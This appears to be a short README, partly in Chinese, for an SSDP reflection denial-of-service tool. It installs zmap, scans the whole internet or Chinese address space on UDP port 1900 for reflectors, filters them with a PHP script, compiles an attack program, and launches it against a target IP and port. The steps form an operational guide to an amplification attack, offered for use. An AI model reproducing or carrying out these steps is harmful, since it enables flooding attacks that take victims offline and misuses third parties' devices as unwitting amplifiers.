# SSDP
yum -y install gcc+ gcc-c++<br>
yum -y install gcc libcap libpcap libpcap-devel screen php dstat cmake gmp gmp-devel gengetopt byacc flex git json-c cpan vnstat zmap<br>
yum install cmake gmp-devel gengetopt libpcap-devel flex byacc json-c-devel libunistring-devel<br>
wget ftp://ftp.gnu.org/gnu/gengetopt/gengetopt-2.22.6.tar.gz<br>
tar -zvxf gengetopt-2.22.6.tar.gz<br>
cd gengetopt-2.22.6<br>
./configure<br>
make<br>
make install<br>
安装zmap<br>
yum install git<br>
git clone https://github.com/zmap/zmap<br>
cd zmap/<br>
cmake .<br>
make -j4<br>
make install<br>
安装完成！<br>
扫描全球：screen zmap -M udp -p 1900 --probe-args=file:upnp_1900.pkt -o ssdp.txt<br>
扫描国内：screen zmap -M udp -p 1900 -w cn.txt -B 100M --probe-args=file:upnp_1900.pkt -o ssdpscan.txt<br>
扫描完成后,我们开始执行过滤!<br>
过滤 ： php ssdpfilter.php ssdp.txt ssdpfiltered.txt 200 1000  <br>
200处理个数  1000线程<br>
全自动：screen ./scan 1<br>
自动过滤跟扫描，到时候表完成过后是ssdp.txt<br>
编译攻击脚本：<br>
gcc -pthread ssdp.c -o ssdp<br>
攻击：<br>
./ssdp <target IP> <target port> <reflection file>  <time (optional)>
